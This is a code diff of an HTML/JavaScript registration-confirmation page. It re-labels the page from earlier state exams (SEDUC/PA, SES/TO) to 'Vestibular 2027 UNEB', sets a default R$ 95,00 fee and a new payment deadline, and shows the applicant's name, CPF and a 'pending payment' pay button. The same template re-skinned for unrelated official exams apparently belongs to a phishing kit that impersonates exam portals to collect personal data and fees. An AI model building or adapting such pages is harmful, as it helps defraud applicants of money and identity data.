@@ -704,7 +704,7 @@ h2.tituloPagina span { border-bottom:0 !important; text-indent:0 !important; pad
 }
 </style>
 <div class="blocoPadrao"><div class="dados">
-<h1 style="font-size:20px;font-weight:700;color:#002D4D;margin:0 0 16px;padding:0 0 18px;line-height:1.3;letter-spacing:.2px;border-bottom:1px solid #e5e9ef">CONCURSO SECRETARIA DE ESTADO DE EDUCAÇÃO DO PARÁ - SEDUC/PA</h1>
+<h1 style="font-size:20px;font-weight:700;color:#002D4D;margin:0 0 16px;padding:0 0 18px;line-height:1.3;letter-spacing:.2px;border-bottom:1px solid #e5e9ef">Vestibular - 2027 - UNEB - Universidade do Estado da Bahia</h1>
 <h1>Inscrição realizada</h1>
 
 <div style="padding:14px 25px 30px 25px;font-family:Arial,Helvetica,sans-serif;color:#333;">
@@ -762,15 +762,8 @@ h2.tituloPagina span { border-bottom:0 !important; text-indent:0 !important; pad
   set('r-nome', d.NOME);
   set('r-cpf', d.CPF);
   set('r-vaga', d.__vaga_label || d.VAGA || '');
-  var __valorTxt = d.__taxa;
-  if(!__valorTxt){
-    var __c = parseInt((d.VAGA || ''), 10);
-    var __lbl = (d.__vaga_label || '').toUpperCase();
-    var __v = (!isNaN(__c)) ? ((__c >= 13 && __c <= 15) ? 120 : 160)
-              : (__lbl.indexOf('ASSISTENTE') !== -1 ? 120 : (__lbl.indexOf('ESPECIALISTA') !== -1 ? 160 : null));
-    __valorTxt = (__v != null) ? ('R$ ' + __v.toFixed(2).replace('.', ',')) : '';
-  }
-  set('r-valor', __valorTxt || '');
+  var __valorTxt = d.__taxa || (d.__valor ? ('R$ ' + Number(d.__valor).toFixed(2).replace('.', ',')) : 'R$ 95,00');
+  set('r-valor', __valorTxt || 'R$ 95,00');
 
   var bPag = document.getElementById('btn-pagar');
   if(bPag) bPag.addEventListener('click', function(){
@@ -1468,10 +1461,10 @@ html, body { overflow-x: hidden !important; }
   function ready(fn){ if(document.readyState!=='loading')fn(); else document.addEventListener('DOMContentLoaded',fn); }
   ready(function(){
     var d={}; try{ d=JSON.parse(sessionStorage.getItem('inscricao_dados')||'{}'); }catch(e){}
-    var concurso='Concurso da Secretaria de Saúde do Estado do Tocantins (SES/TO)';
+    var concurso='Vestibular - 2027 - UNEB - Universidade do Estado da Bahia';
     var cargo=(d.__vaga_label||'—');
     var proto=(d.__protocolo||'—');
-    var valor=(d.__taxa || (d.__valor?('R$ '+Number(d.__valor).toFixed(2).replace('.',',')):'—'));
+    var valor=(d.__taxa || (d.__valor?('R$ '+Number(d.__valor).toFixed(2).replace('.',',')):'R$ 95,00'));
     var mainCard=document.querySelector('.blocoPadrao');
 
     var view=document.createElement('div');
@@ -1488,7 +1481,7 @@ html, body { overflow-x: hidden !important; }
             +'<div style="font-size:13px;color:#475569;line-height:1.9"><strong>Cargo:</strong> '+cargo+'<br>'
             +'<strong>Nº da inscrição:</strong> '+proto+'<br>'
             +'<strong>Valor:</strong> '+valor+'<br>'
-            +'<strong>Prazo para pagamento da taxa:</strong> Até 01/10/2026</div>'
+            +'<strong>Prazo para pagamento da taxa:</strong> Até 07/10/2026</div>'
           +'</div>'
           +'<span style="background:#fff3cd;color:#8a6d00;font-weight:700;font-size:12px;padding:6px 14px;border-radius:20px;white-space:nowrap">PENDENTE DE PAGAMENTO</span>'
         +'</div>'
